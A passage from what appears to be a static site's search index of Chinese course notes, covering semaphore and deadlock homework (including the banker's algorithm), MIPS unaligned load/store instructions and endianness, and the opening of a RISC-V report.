N),\u4f46\u8981\u6c42\u4ed3\u5e93\u4e2d A\u3001B \u4e24 \u79cd\u7269\u54c1\u7684\u6570\u91cf\u6ee1\u8db3\u4e0b\u8ff0\u4e0d\u7b49\u5f0f\uff1a $$    -M\u2264A \u7269\u54c1\u6570\u91cf-B \u7269\u54c1\u6570\u91cf\u2264N $$ \u5176\u4e2d M \u548c N \u4e3a\u6b63\u6574\u6570\u3002\u53e6\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u8fdb\u7a0b\u6d88\u8d39 A \u548c B\uff0c\u4e00\u6b21\u53d6\u4e00\u4e2a A \u4e0e B \u7ec4\u88c5\u6210 C\u3002 \u8bd5\u7528\u4fe1\u53f7\u91cf\u548c P\u3001V \u64cd\u4f5c\u63cf\u8ff0 A\u3001B \u4e24\u79cd\u7269\u54c1\u7684\u5165\u5e93\u548c\u51fa\u5e93 (\u7ec4\u88c5\u6210 C) \u8fc7\u7a0b\u3002</p> <p>\u7b54\uff1a \u8bbe nA, nB \u5206\u522b\u4e3a A \u7269\u54c1\uff0cB \u7269\u54c1\u6570\u91cf\uff0c\u4e8c\u8fdb\u5236\u4fe1\u53f7\u91cf mutex\uff0c\u521d\u59cb\u503c\u4e3a 1\u3002</p> <p>A \u5165\u5e93\u8fdb\u7a0b\uff1a</p> <pre><code>wait(mutex)\nnA++\nif(nA &lt;= N &amp;&amp; -M &lt;= nA-nB &lt;= N)\n    A\u5165\u5e93\nelse\n    nA--\nsignal(mutex)\n</code></pre> <p>B \u5165\u5e93\u8fdb\u7a0b\uff1a</p> <pre><code>wait(mutex)\nnB++\nif(nB &lt;= N &amp;&amp; -M &lt;= nA-nB &lt;= N)\n    B\u5165\u5e93\nelse\n    nB--\nsignal(mutex)\n</code></pre> <p>C \u51fa\u5e93\u8fdb\u7a0b\uff1a</p> <pre><code>wait(mutex)\nif(nA&gt;0 &amp;&amp; nB&gt;0)\n    nA--;nB--\n    C\u51fa\u5e93\nsignal(mutex)\n</code></pre> <p>changed:</p> <pre><code>semaphore initiation:\n    muxtex = 1\n    empty  = N\n    delta  = M\n    nA = nB = 0\nprogress A:\ndo{\n    P(empty)\n    P(mutex)\n        A in\n    V(mutex)\n    V(nA)\n    V(delta)\n}while(true)\n\nprogress B:\ndo{\n    P(empty)\n    P(delta)\n    P(mutex)\n        B in\n    V(mutex)\n    V(nB)\n}while(true)\n\nprogress C:\ndo{\n    P(nA)\n    P(nB)\n    P(mutex)\n        C out\n    V(mutex)\n    V(empty)\n    V(empty)\n}while(true)\n</code></pre>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/21/2019-10-21-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%83%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E6%AD%BB%E9%94%81/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7b2c 7 \u7ae0 \u4f5c\u4e1a \u6b7b\u9501","text":"","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/21/2019-10-21-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%83%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E6%AD%BB%E9%94%81/#1","title":"1\u3001","text":"<p>Consider the traffic deadlock depicted in follow figure.</p> <p></p> <p>a. Show that the four necessary conditions for deadlock indeed hold in this example. b. State a simple rule for avoiding deadlocks in this system.</p> <ul> <li>a.     1. mutual exclusion: \u6bcf\u6761\u9053\u8def\u90fd\u53ea\u80fd\u8ba9\u4e00\u4e2a\u65b9\u5411\u7684\u8f66\u901a\u884c\uff0c\u4e14\u8f66\u4e4b\u95f4\u4e0d\u53ef\u80fd\u7a7f\u900f\u800c\u8fc7\u3002     2. hold and wait: \u56db\u4e2a\u65b9\u5411\u7684\u8f66\u8f86\u90fd\u5360\u6709\u4e00\u6761\u9053\u8def\uff0c\u5e76\u7b49\u5f85\u53e6\u4e00\u65b9\u5411\u7684\u8f66\u9732\u51fa\u7a7a\u9699\u3002     3. no preemption: \u6bcf\u4e2a\u65b9\u5411\u7684\u8f66\u90fd\u5fc5\u987b\u7b49\u5f85\u53e6\u4e00\u4e2a\u65b9\u5411\u7684\u8f66\u4e3b\u52a8\u5012\u8f66\uff0c\u65e0\u6cd5\u5f3a\u8feb\u3002     4. circular wait\uff1a\u6bcf\u4e2a\u65b9\u5411\u7684\u8f66\u4e92\u76f8\u7b49\u5f85\uff0c\u5f62\u6210\u4e00\u4e2a\u73af\u3002</li> <li>b. \u5b89\u6392\u4e00\u4f4d\u4ea4\u8b66\u9009\u62e9\u5e76\u6307\u6325\u4e00\u4e2a\u65b9\u5411\u7684\u8f66\u8ba9\u51fa\u9053\u8def\u3002</li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/21/2019-10-21-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%83%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E6%AD%BB%E9%94%81/#2","title":"2\u3001","text":"<p>Consider a system consisting of four resources of the same type that are shared by three processes, each of which needs at most two resources. Show that the system is deadlock free.</p> <p>\u7b54\uff1a\u53cd\u8bc1\u6cd5\uff0c\u5047\u8bbe\u5f62\u6210\u4e86\u6b7b\u9501\u3002\u5219\u7531\u6bcf\u4e2a\u8fdb\u7a0b\u6700\u591a\u9700\u6c42 2 \u4e2a\u8d44\u6e90\u5b9e\u4f8b\uff0c\u548c\u6b7b\u9501\u5fc5\u8981\u6761\u4ef6\u4e2d\u7684 3\uff0c4 \u70b9\u53ef\u77e5\uff0c\u552f\u4e00\u7684\u60c5\u5f62\u662f\uff1a\u4e09\u4e2a\u8fdb\u7a0b\u5404\u81ea\u5360\u6709\u4e00\u4e2a\u8d44\u6e90\u4e14\u7b49\u5f85\u53e6\u4e00\u4e2a\u8d44\u6e90\uff0c\u5e76\u5f62\u6210\u4e86\u4e00\u4e2a\u73af\u3002\u800c\u5728\u8be5\u60c5\u51b5\u4e0b\uff0c\u5269\u4f59\u7684\u4e00\u4e2a\u8d44\u6e90\u5bfc\u81f4\u6b7b\u9501\u4e0d\u4f1a\u53d1\u751f\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/21/2019-10-21-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%83%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E6%AD%BB%E9%94%81/#3","title":"3\u3001","text":"<p>Consider a system consisting of m resources of the same type being shared by n processes. Resources can be requested and released by processes only one at a time. Show that the system is deadlock free if the following two conditions hold:</p> <ul> <li>a. The maximum need of each process is between 1 and m resources.</li> <li>b. The sum of all maximum needs is less than m + n.</li> </ul> <p>$ a. \\sum_{i=1}^n Max_i &lt; m+n $ $ b. Max_i \\geq 1 for all i $ $ c. Need_i = Max_i \u2212 Allocation_i $</p> <p>If there exists a deadlock state then: $ d. \\sum_{i=1}^n Allocation_i = m $</p> <p>$ a,b,c,d \\Rightarrow \\sum_{i=1}^n Need_i &lt; n $</p> <p>This implies that there exists a process $ P_i $ such that $ Need_i = 0 $. Since $ Max_i &gt;= 1 $, it follows that $ P_i $ has at least one resource, the deadlock can't maintain.</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/21/2019-10-21-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%83%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E6%AD%BB%E9%94%81/#4","title":"4\u3001","text":"<p>Consider the following snapshot of a system:</p> PID AL. MAX A B C D A B C D P0 0 0 1 2 0 0 1 2 P1 1 0 0 0 1 7 5 0 P2 1 3 5 4 2 3 5 6 P3 0 6 3 2 0 6 5 2 P4 0 0 1 4 0 6 5 6 AV. A B C D 1 5 2 0 <p>(p.s. AL.= Allocated:, AV.= Available)</p> <p>Answer the following questions using the banker's algorithm: a. What is the content of the matrix Need? b. Is the system in a safe state? c. If a request from process $ P_1 $ arrives for (0,4,2,0), can the request be granted immediately?</p> <ul> <li>a     | PID | need |   |   |   |     | --- | --- | - | - | - |     |     | A   | B | C | D |     | P0  | 0   | 0 | 0 | 0 |     | P1  | 0   | 7 | 5 | 0 |     | P2  | 1   | 0 | 0 | 2 |     | P3  | 0   | 0 | 2 | 0 |     | P4  | 0   | 6 | 4 | 2 |</li> <li>b \u7531\u94f6\u884c\u5bb6\u7b97\u6cd5\u53ef\u77e5\u662f\u5b89\u5168\u7684\uff0c\u5e8f\u5217\\(&lt;0,2,1,3,4&gt;\\)\u4e3a\u5b89\u5168\u5e8f\u5217\u3002</li> <li>c \u5047\u8bbe\u6ee1\u8db3\uff0c\u5219$ Need_{P_1} =(0,11,7,0) \\(\uff0c\u5e8f\u5217\\) &lt;0,2,3,4,1&gt; $\u4e3a\u5b89\u5168\u5e8f\u5217\uff0c\u6545\u53ef\u7acb\u5373\u6ee1\u8db3\u3002</li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/21/2019-10-21-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%83%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E6%AD%BB%E9%94%81/#5","title":"5\u3001","text":"<p>Consider a system with four processes$ P_1, P_2, P_3$ and $ P_4 $, and two resources, $ R_1, R_2 $ respectively. Each resource has two instances. Furthermore:</p> <p>$ P_1 $ allocates an instance of $ R_2 $  , and requests an instance of $ R_1 $ ; $ P_2 $  allocates an instance of $ R_1 $ , and doesn\u2019t need any other resource; $ P_3 $  allocates an instance of $ R_1 $ and requires an instance of $ R_2 $ ; $ P_4 $  allocates an instance of $ R_2 $ , and doesn\u2019t need any other resource. Answer the following questions:</p> <p>a. Draw the resource allocation graph. b. Is there a cycle in the graph? If yes name it. c. Is the system in deadlock? If yes, explain why. If not, give a possible sequence of executions after which every process completes.</p> <ul> <li>a. \u7565</li> <li>b. \u5b58\u5728</li> <li>c. \u4e0d\u662f\uff0c$  $","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/12/21/2019-12-21-mips%E9%9D%9E%E5%AF%B9%E9%BD%90%E6%8C%87%E4%BB%A4%E4%B8%8E%E5%A4%A7%E5%B0%8F%E7%AB%AF/","title":"\u975e\u5bf9\u9f50\u6307\u4ee4\u603b\u7ed3","text":"","tags":["mips","\u5927\u5c0f\u7aef"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/12/21/2019-12-21-mips%E9%9D%9E%E5%AF%B9%E9%BD%90%E6%8C%87%E4%BB%A4%E4%B8%8E%E5%A4%A7%E5%B0%8F%E7%AB%AF/#1-\u5927\u7aef\u4e0e\u5c0f\u7aef","title":"1 \u5927\u7aef\u4e0e\u5c0f\u7aef","text":"<ul> <li>\u5927\u7aef\uff1a\u6570\u636e\u7684\u9ad8\u4f4d\u4f4d\u4e8e\u5185\u5b58\u7684\u4f4e\u5730\u5740\uff0c\u6570\u636e\u7684\u5730\u4f4d\u4f4d\u4e8e\u5185\u5b58\u7684\u9ad8\u5730\u5740\u3002</li> <li>\u5c0f\u7aef\uff1a\u4e0e\u5927\u7aef\u76f8\u53cd\u3002</li> </ul> <p>\u4e8b\u5b9e\u4e0a\u5927\u7aef\u66f4\u7b26\u5408\u4eba\u7684\u601d\u7ef4\uff0c\u56e0\u4e3a\u5728\u5199\u4e00\u4e2a\u6570\u5b57\u65f6\u4eba\u4eec\u66f4\u4e60\u60ef\u4ece\u9ad8\u4f4d\u5199\u5230\u4f4e\u4f4d\uff0c\u4e14\u9ad8\u4f4d\u662f\u5199\u5728\u5de6\u8fb9\u7684\u3002\u800c\u8fd9\u53ef\u4ee5\u76f4\u63a5\u548c\u5185\u5b58\u7684\u201c\u56fe\u50cf\u201d\u5bf9\u5e94\uff0c\u800c\u5c0f\u7aef\u5219\u9700\u8981\u628a\u6bcf\u4e2a\u5b57\u7684\u5b57\u8282\u5730\u5740\u98a0\u5012\u4e00\u4e0b\u624d\u53ef\u4ee5\u3002 \u4f8b\u5982\uff0c\u4e00\u4e2a 32 \u4f4d\u7684\u6574\u6570 0xffeeddcc\uff0c\u5728\u5185\u5b58\u91cc\u7684\u5b58\u50a8\u60c5\u51b5\u5982\u4e0b\u3002\uff08\u975e\u5bf9\u9f50\uff0c\u8d77\u59cb\u5730\u5740\u4e3a 0x01\uff09</p> <p>\u5927\u7aef:            0  1  2  3 0x00    00ffeedd 0x01    cc556677 \u5c0f\u7aef:            3  2  1  0 0x00    eeddcc00 0x01    776655ff ps.\u5047\u8bbe\u9664\u53bb\u8be5\u6574\u6570\u5b58\u50a8\u7684\u7a7a\u95f4\uff0c\u5b57\u8282\u5730\u5740\u4e0e\u5b58\u50a8\u7684\u5341\u516d\u8fdb\u5236\u6570\u5bf9\u5e94\uff0c\u5373\u5730\u5740\u4e3a 0x01 \u5b58 11\uff0c0x05 \u5b58 55\uff0c\u8fd9\u70b9\u7528\u6765\u7a81\u51fa\u5b57\u8282\u5730\u5740\u662f\u591a\u5c11\u3002</p>","tags":["mips","\u5927\u5c0f\u7aef"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/12/21/2019-12-21-mips%E9%9D%9E%E5%AF%B9%E9%BD%90%E6%8C%87%E4%BB%A4%E4%B8%8E%E5%A4%A7%E5%B0%8F%E7%AB%AF/#2-\u975e\u5bf9\u9f50\u6307\u4ee4","title":"2 \u975e\u5bf9\u9f50\u6307\u4ee4","text":"<p>instruction lwl/swl, lwr/swr usage lwl t0, offset(s0)</p> <p>\u5176\u4e2d\u7684 left\uff0c\u4e0e shift left \u7684\u201c\u5de6\u201d\u90fd\u8868\u793a\u6570\u636e\u7684\u9ad8\u4f4d\u3002right \u5219\u8868\u793a\u6570\u636e\u7684\u4f4e\u4f4d\u3002</p> <p>lwl \u8868\u793a\u5c06\u5185\u5b58\u5bf9\u5e94\u5730\u5740\u6240\u5728\u7684\u5b57\uff08align_address\uff0c\u5373\u62b9\u6389\u5730\u5740\u4f4e\u4e24\u4f4d\u5bf9\u5e94\u5730\u5740\uff09\u7684\u6570\u636e\u4f4e\u4f4d\u590d\u5236\u5230\u5bc4\u5b58\u5668\u6570\u636e\u7684\u9ad8\u4f4d\u3002\u5bc4\u5b58\u5668\u5176\u5b83\u90e8\u5206\u4e0d\u53d8\u3002</p> <p>swl \u5219\u8868\u793a\u5c06\u5bc4\u5b58\u5668\u7684\u6570\u636e\u9ad8\u4f4d\u590d\u5236\u5230\u5185\u5b58\u5bf9\u5e94\u6570\u636e\u4f4e\u4f4d\u3002\u5176\u5b83\u90e8\u5206\u4e0d\u53d8\u3002 \u5373 lwl/swl \u5bc4\u5b58\u5668\u6570\u636e\u9ad8\u4f4d\u21b9\u5185\u5b58\u6570\u636e\u4f4e\u4f4d lwr/swr \u5bc4\u5b58\u5668\u6570\u636e\u4f4e\u4f4d\u21b9\u5185\u5b58\u6570\u636e\u9ad8\u4f4d</p>","tags":["mips","\u5927\u5c0f\u7aef"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/12/21/2019-12-21-mips%E9%9D%9E%E5%AF%B9%E9%BD%90%E6%8C%87%E4%BB%A4%E4%B8%8E%E5%A4%A7%E5%B0%8F%E7%AB%AF/#1-\u4ece1-\u4e2d\u8bfb\u53d6\u8be5\u6574\u6570\u5b9e\u4f8b","title":"1 \u4ece#1 \u4e2d\u8bfb\u53d6\u8be5\u6574\u6570\u5b9e\u4f8b","text":"<p>\u5927\u7aef lwl s0, 0(1) lwr s0, 3(1) \u5c0f\u7aef lwr s0, 0(1) lwl s0, 3(1)</p> <p>\u5c06\u6574\u6570\u4ee5\u56fe\u4e2d\u6240\u793a\u5b58\u50a8\u5230\u5185\u5b58\u4e2d\u53ea\u9700\u5c06 lw*\u6539\u4e3a sw*\u3002</p> <p>\u53ef\u4ee5\u4ee5\u6b64\u5b9a\u4e49\u975e\u5bf9\u9f50\u52a0\u8f7d\u3001\u5b58\u50a8\u4f2a\u6307\u4ee4\uff0c \u5982 uld(rd, rb) \u8868\u793a\u975e\u5bf9\u9f50 load\uff0c\u52a0\u8f7d\u5185\u5b58[rb+3:rb]\u7684\u6570\u636e\uff0c uld(rd, rb)=&gt; lwl rd, 0(rb) lwr rd, 3(rb) \uff08\u53ef\u80fd uld \u662f\u52a0\u8f7d 8 \u5b57\u8282\uff0c\u5f85\u786e\u8ba4\uff09</p>","tags":["mips","\u5927\u5c0f\u7aef"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/12/21/2019-12-21-mips%E9%9D%9E%E5%AF%B9%E9%BD%90%E6%8C%87%E4%BB%A4%E4%B8%8E%E5%A4%A7%E5%B0%8F%E7%AB%AF/#2-\u5173\u4e8e-loadstore-\u591a\u5c11\u5b57\u8282","title":"2 \u5173\u4e8e load/store \u591a\u5c11\u5b57\u8282","text":"<p>n \u4e3a\u5730\u5740\u4f4e 2 \u4f4d\uff0cn=addr[1:0] \u5927\u7aef lwl/swl  4-n lwr/swr   n+1 \u5c0f\u7aef lwr/swr 4-n lwl/swl n+1</p>","tags":["mips","\u5927\u5c0f\u7aef"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/01/07/2020-02-09-RISC-V-trend/","title":"RISC-V \u62a5\u544a","text":"<p>author: \u8ba1\u79d1\u5353\u8d8a\u73ed \u8881\u798f\u7131 20174260</p>","tags":["risc-v"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/01/07/2020-02-09-RISC-V-trend/#0-\u5bfc\u8a00","title":"0. \u5bfc\u8a00","text":"<p>RISC-V \u662f 21 \u4e16\u7eaa\u8bde\u751f\u7684\u4e00\u79cd\u5b8c\u5168\u5f00\u653e\u7684\u8ba1\u7b97\u673a\u7cbe\u7b80\u6307\u4ee4\u96c6\uff0c\u53ef\u5e94\u7528\u4e8e\u5c0f\u5230\u5d4c\u5165\u5f0f\u7cfb\u7edf\u5927\u5230\u9ad8\u6027\u80fd\u5904\u7406\u5668\u7b49\u5e7f\u6cdb\u9886\u57df\u3002RISC-V \u5145\u5206\u6c72\u53d6\u4e86\u8bb8\u591a\u6307\u4ee4\u96c6\u7684\u5b9e\u8df5\u7ecf\u9a8c\uff0c\u5177\u6709\u975e\u5e38\u591a\u7684\u4f18\u70b9\u3002\u5e76\u4e14\u5b83\u5b8c\u5168\u5f00\u653e\uff0c\u91c7\u7528 BSD \u5f00\u6e90\u534f\u8bae\u2014\u2014\u5168\u4e16\u754c\u4efb\u4f55\u516c\u53f8\u3001\u5927\u5b66\u3001\u4e2a\u4eba\u90fd\u53ef\u4ee5\u81ea\u7531\u514d\u8d39\u5730\u4f7f\u7528 RISC-V \u6307\u4ee4\u96c6\u6784\u5efa\u81ea\u5df1\u7684\u7cfb\u7edf\u3002</p> <p>\u672c\u62a5\u544a\u7b2c\u4e00\u90e8\u5206\u8bb2\u8ff0 RISC-V \u7684\u51e0\u4e2a\u4e3b\u8981\u7279\u70b9\u4e0e\u4f18\u52bf\uff0c\u7b2c\u4e8c\u90e8\u5206\u4ecb\u7ecd RISC-V \u7684\u76ee\u524d\u5df2\u6784\u5efa\u5efa\u7684\u751f\u6001\u7cfb\u7edf\u3002\u6700\u540e\u4e00\u90e8\u5206\uff0c\u8c08\u8bba RISC-V \u5728\u63a8\u52a8\u5f00\u6e90\u786c\u4ef6\u4e2d\u8d77\u5230\u7684\u4f5c\u7528\u3002</p>","tags":["risc-v"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/01/07/2020-02-09-RISC-V-trend/#1-risc-v-\u7684\u7279\u70b9","title":"1. RISC-V \u7684\u7279\u70b9","text":"","tags":["risc-v"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/01/07/2020-02-09-RISC-V-trend/#11-\u6307\u4ee4\u96c6\u6a21\u5757\u5316","title":"1.1 \u6307\u4ee4\u96c6\u6a21\u5757\u5316","text":"<p>\u4ee5\u5f80\u7684\u6307\u4ee4\u96c6\u4e3a\u4e86\u5b9e\u73b0\u517c\u5bb9\uff0c\u5f80\u5f80\u91c7\u7528\u589e\u91cf\u6269\u5c55\u7684\u65b9\u6cd5\u3002\u5373\u65b0\u7684\u5904\u7406\u5668\u4e0d\u4ec5\u8981\u5b9e\u73b0\u65b0\u7684\u6269\u5c55\uff0c\u8fd8\u5fc5\u9700\u8981\u5b9e\u73b0\u8fc7\u53bb\u6240\u6709\u7684\u6269\u5c55\u3002\u5982\u5178\u578b\u7684 x86 \u67b6\u6784\uff0c\u5176\u4e2d\u8bb8\u591a\u6307\u4ee4\u65e9\u5df2\u5931\u6548\uff0c\u4f46\u4e3a\u4e86\u517c\u5bb9\u6027\u5374\u5fc5\u987b\u5b9e\u73b0\uff0c\u8fd9\u5bfc\u81f4\u786c\u4ef6\u5b9e\u73b0\u53d8\u5f97\u8d8a\u6765\u8d8a\u590d\u6742\u3002RISC-V \u6309\u7167\u529f\u80fd\u5c06\u6307\u4ee4\u96c6\u5206\u4e3a\u5f88\u591a\u4e2a\u6a21\u5757\u3002\u5176\u4e2d I \u6a21\u5757\u4e3a\u57fa\u7840\u6574\u578b\u6307\u4ee4\u96c6\uff0c\u8fd9\u662f RISC-V \u8981\u6c42\u5fc5\u987b\u5b9e\u73b0\u7684\u6307\u4ee4\u96c6\uff0c\u5e76\u4e14\u6c38\u8fdc\u4e0d\u4f1a\u53d1\u751f\u6539\u53d8\u3002\u53ea\u8981\u5b9e\u73b0\u4e86\u8be5\u6307\u4ee4\u96c6\u4fbf\u53ef\u4ee5\u8fd0\u884c\u5b8c\u6574\u7684\u57fa\u4e8e RISC-V \u7684\u8f6f\u4ef6\u3002\u8fd9\u6837\uff0cRISC-V \u5728\u6269\u5c55\u65f6\u4fbf\u4e0d\u518d\u4f1a\u50cf x86 \u90a3\u6837\u80cc\u4e0a\u6c89\u91cd\u7684\u5386\u53f2\u5305\u88f9\u3002\u7f16\u8bd1\u5668\u4e5f\u53ef\u4ee5\u5728\u4fdd\u8bc1\u517c\u5bb9\u7684\u57fa\u7840\u4e0a\uff0c\u6839\u636e\u5df2\u5b9e\u73b0\u7684\u6269\u5c55\uff0c\u9009\u62e9\u6027\u5730\u751f\u6210\u66f4\u9ad8\u6548\u7684\u4ee3\u7801\u3002</p>","tags":["risc-v"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/01/07/2020-02-09-RISC-V-trend/#12-\u56de\u907f\u4ee5\u5f80\u7684\u8bbe\u8ba1\u7f3a\u9677","title":"1.2 \u56de\u907f\u4ee5\u5f80\u7684\u8bbe\u8ba1\u7f3a\u9677","text":"<p>\u76ee\u524d\u4e3b\u6d41\u7684\u6307\u4ee4\u96c6\u6709 x86, ARM, MIPS \u7b49\u3002\u5176\u4e2d x86 \u4e3a\u590d\u6742\u6307\u4ee4\u96c6 (RISC)\uff0c\u4e8e 1978 \u5e74\u8bde\u751f\u3002\u800c ARM, MIPS \u4e3a\u7cbe\u7b80\u6307\u4ee4\u96c6 (RISC)\uff0c\u90fd\u662f 1986 \u5e74\u8bde\u751f\u7684\u3002\u4ece\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u7684\u53d1\u5c55\u4e0a\u6765\u770b\uff0cRISC \u7531\u4e8e\u7b80\u6d01\u6027\uff0c\u80fd\u591f\u66f4\u52a0\u5145\u5206\u5730\u5229\u7528\u73b0\u4ee3\u5fae\u4f53\u7cfb\u7ed3\u6784\u4e2d\u7684\u6d41\u6c34\u7ebf\u3001\u5206\u652f\u9884\u6d4b\u3001cache \u7b49\u6280\u672f\uff0c\u56e0\u6b64\u6bd4 CISC \u66f4\u52a0\u9ad8\u6548\u3002\u56e0\u6b64\uff0c\u8bde\u751f\u4e8e 21 \u4e16\u7eaa (2004) \u7684 RISC-V\uff0c\u5fc5\u7136\u4e5f\u662f\u7cbe\u7b80\u6307\u4ee4\u96c6\u3002\u5e76\u4e14\uff0c\u7531\u4e8e\u6709\u4e86\u524d\u9762\u6307\u4ee4\u7684\u7ecf\u9a8c\uff0cRISC-V \u5438\u6536\u4e86\u4ee5\u5f80\u6307\u4ee4\u96c6\u7684\u4f18\u70b9\uff0c\u5e76\u56de\u907f\u4e86\u4ee5\u5f80\u6307\u4ee4\u96c6\u7684\u4e00\u4e9b\u7f3a\u9677\u3002\u4f18\u70b9\u5982\uff0cRISC-V \u6709 32 \u4e2a\u901a\u7528\u5bc4\u5b58\u5668\uff0c\u6709\u4e13\u95e8\u7684 0 \u5bc4\u5b58\u5668\u3002\u4f7f\u7528\u4e13\u95e8\u7684\u79fb\u4f4d\u6307\u4ee4\u6765\u5904\u7406\u79fb\u4f4d\u64cd\u4f5c\u3002\u4f7f\u7528 load/store \u6307\u4ee4\u8bbf\u95ee\u5185\u5b58\u3002\u8df3\u8f6c\u6307\u4ee4\u4e0d\u4f7f\u7528\u6761\u4ef6\u7801\u3002\u7f3a\u9677\u5219\u5982\uff0cRISC-V \u5e9f\u5f03\u4e86 MIPS \u4e2d\u7684\u5206\u652f\u5ef6\u8fdf\u69fd (\u6709\u5229\u4e8e\u67b6\u6784\u548c\u5b9e\u73b0\u7684\u5206\u79bb)\uff0c\u7acb\u5373\u6570\u53ea\u8fdb\u884c\u6709\u7b26\u53f7\u6269\u5c55\uff0c\u7b97\u6570\u8fd0\u7b97\u4e0d\u629b\u51fa\u5f02\u5e38 (\u901a\u8fc7\u8f6f\u4ef6\u5224\u65ad)\uff0c\u66f4\u89c4\u6574\u7684\u6307\u4ee4\u683c\u5f0f\uff08\u6e90\u53ca\u76ee\u7684\u5b57\u6bb5\u4f4d\u7f6e\u56fa\u5b9a\uff09\uff0c\u6574\u6570\u4e58\u9664\u6cd5\u53ef\u9009 (\u7b80\u5316\u4e86\u57fa\u7840\u5b9e\u73b0)\u3002</p>","tags":["risc-v"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/01/07/2020-02-09-RISC-V-trend/#13-\u5b8c\u5168\u5f00\u653e","title":"1.3 \u5b8c\u5168\u5f00\u653e","text":"<p>RISC-V \u91c7\u7528 BSD \u5f00\u6e90\u534f\u8bae\uff0c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u81ea\u7531\u514d\u8d39\u5730\u4f7f\u7528 RISC-V\u3002\u5176\u4ed6\u6307\u4ee4\u96c6\u5982 x86 \u662f\u5b8c\u5168\u95ed\u6e90\u7684\uff0c\u53ea\u6709 intel \u548c AMD \u7b49\u5c11\u6570\u516c\u53f8\u80fd\u591f\u57fa\u4e8e x86 \u67b6\u6784\u751f\u4ea7\u4ea7\u54c1\u3002\u800c ARM \u548c MIPS \u90fd\u91c7\u7528\u6388\u6743\u7684\u65b9\u5f0f\uff0c\u901a\u8fc7\u5356\u6388\u6743\u7684\u65b9\u5f0f\u76c8\u5229\uff0c\u5176\u4e2d ARM \u7684\u6388\u6743\u8d39\u5219\u5341\u5206\u6602\u8d35\u3002RISC-V \u5982\u4eca\u7531 RISC-V \u57fa\u91d1\u4f1a\u7ef4\u62a4\uff0c\u4efb\u4f55\u516c\u53f8\u53ea\u8981\u613f\u610f\u6bcf\u5e74\u652f\u4ed8\u4e00\u7b14\u4f1a\u5458\u8d39\u5373\u53ef\u6210\u4e3a\u4f1a\u5458\uff0c\u4f1a\u5458\u53ef\u4ee5\u53c2\u4e0e\u5230 RISC-V \u4e4b\u540e\u6807\u51c6\u7684\u5236\u5b9a\u4e2d\u3002RISC-V \u4e5f\u56e0\u6b64\u771f\u6b63\u6210\u4e3a\u4e00\u4e2a\u5f00\u653e\u7684\u6307\u4ee4\u96c6\uff0c\u4e0d\u4f1a\u56e0\u4e3a\u4efb\u4f55\u4e00\u4e2a\u516c\u53f8\u7684\u8d77\u4f0f\u800c\u53d7\u5230\u5f71\u54cd\u3002</p>","tags":["risc-v"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/01/07/2020-02-09-RISC-V-trend/#2-risc-v-\u7684\u751f\u6001","title":"2. RISC-V \u7684\u751f\u6001","text":"<p>\u4ee5\u4e0b\u5185\u5bb9\u5f15\u7528\u81ea\u5f00\u653e\u6307\u4ee4\u96c6\u4e0e\u5f00\u6e90\u82af\u7247\u8fdb\u5c55\u62a5\u544a-v1p1</p> <p>2011 \u5e74\uff0c\u52a0\u5dde\u5927\u5b66\u4f2f\u514b\u5229\u5206\u6821\u53d1\u5e03\u4e86\u5f00\u653e\u6307\u4ee4\u96c6 RISC-V\uff0c\u5e76\u5f88\u5feb\u5efa\u7acb\u8d77\u4e00\u4e2a\u5f00\u6e90\u8f6f\u786c\u4ef6\u751f\u6001\u7cfb\u7edf\u3002\u622a\u6b62 2019 \u5e74 1 \u6708\uff0c\u5df2\u6709\u5305\u62ec Google\u3001NVidia \u7b49\u5728\u5185\u7684 200 